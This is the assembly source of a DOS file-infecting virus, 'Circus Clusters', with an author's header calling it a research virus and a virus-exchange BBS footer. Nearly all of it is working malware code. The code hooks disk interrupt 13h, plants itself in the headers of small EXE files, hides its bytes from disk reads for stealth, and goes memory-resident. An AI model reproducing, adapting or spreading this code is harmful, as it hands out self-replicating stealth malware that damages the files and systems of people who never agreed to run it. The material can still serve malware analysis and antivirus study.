;
; Circus Clusters by John Tardy
;
; This virus is a purely research virus and will not be very able to spread
; itself. It only infects .EXE files smaller than 64K and have a very small
; relocation header, so it can hide itself there. It is fully stealth and it
; only occupies 273 bytes (512-273=239 bytes left for the exe header and the
; relocation table, which ain't much). However, it is functional and can
; spread itself if the criteria files are aveable. If this virus is enhanced,
; it could be a serious threath to the antiviral community.
;
                Org 100h

Jumpie:         Jmp Short Jumper

                Org 17ch

Old13           DD 0
Jumper:         Jmp Install
New13:          Cmp Ah,3
                Je CheckExe
                Cmp Ah,2
                Jne Org13

                Pushf
                Call Dword Ptr Cs:[Old13]
                Jc Error
                Cmp Word Ptr Es:[Bx],7eebh
                Jne error
                Mov Word Ptr Es:[Bx],'ZM'
                Push Di
                Push Cx
                Push Ax

                Mov Cx,VirLen
                Xor Ax,Ax
                Mov Di,Bx
                Add Di,80h
                Rep Stosb

                Pop Ax
                Pop Cx
                Pop Di
Error:          Iret
Org13:          Jmp Dword Ptr Cs:[Old13]
CheckExe:
                Cmp Word Ptr Es:[Bx],'ZM'               ; EXE file?
                Jne Org13                               ; No do normal INT13

                Cmp Word Ptr Es:[Bx][4],(60000/512)     ; Is it too long?
                Jnb Org13                               ; Yes do normal INT13

                Push Ax
                Push Cx
                Push Si
                Push Di
                Push Ds

                Push Es
                Pop Ds
                Mov Si,Bx
                Add Si,80h
                Mov Cx,VirLen
Find0:          Lodsb
                Cmp Al,0
                Loope Find0
                Cmp Cx,0
                Jne No0

                Mov Di,Bx
                Add Di,80h
                Mov Cx,VirLen
                Lea Si,Old13
                Push Cs
                Pop Ds
                Rep Movsb
                Mov Di,Bx
                Mov Ax,07eebh
                Stosw

No0:
                Pop Ds
                Pop Di
                Pop Si
                Pop Cx
                Pop Ax
                Jmp Org13
Install:
                Mov Ax,3513h
                Int 21h
                Mov Word Ptr Cs:Old13[0],Bx
                Mov Word Ptr Cs:Old13[2],Es

                mov ah,0dh
                int 21h
                mov ah,36h
                mov dl,0
                int 21h

                mov     ax,cs                   ;adjust memory-size
                dec     ax
                mov     ds,ax
                cmp     byte ptr ds:[0],'Z'
                jne     quitit
resit:          sub     word ptr ds:[3],virpar+20h
                sub     word ptr ds:[12h],VirPar+20h
                lea     si,old13
                mov     di,si
                mov     es,ds:[12h]
                mov     ds,cs
                mov     cx,virlen
                rep     movsb

                Mov Ax,2513h
                Mov Ds,es
                Lea Dx,New13
                Int 21h

                Mov Ah,4ah
                Push Cs
                Pop Es
                Mov Bx,VirPar+20h
                Int 21h

                push    cs
                pop     ds
                mov     bx,ds:[2ch]             ; environment segment
                mov     es,bx
                xor     ax,ax
                mov     di,1

Seek:           dec     di                      ; scan for end of environment
                scasw
                jne     Seek
                lea     si,ds:[di+2]            ; es:si = start of filename
Exec:           push    bx
                pop     ds
                push    cs
                pop     es

                mov     di,offset f_name        ; copy name of this file
                push    di
                xor bx,bx
movit:          mov     cx,80
                inc bx
                lodsb
                cmp al,0
                jne stor
                mov al,0dh
stor:           stosb
                cmp al,0dh
                loopne movit
                mov f_len,bl

                push    cs
                pop     ds

                pop si
                dec si
                Int 2eh

quitit:         mov     ah,4ch
                int     21h

f_len           db 0
f_name:         db      1

VirEnd          Equ $
VirLen          Equ $-Old13
VirPar          Equ ($-Jumpie)/16


;  ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;  ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ> ReMeMbEr WhErE YoU sAw ThIs pHile fIrSt <ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;  ÄÄÄÄÄÄÄÄÄÄÄ> ArReStEd DeVeLoPmEnT +31.77.SeCrEt H/p/A/v/AV/? <ÄÄÄÄÄÄÄÄÄÄÄ
;  ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
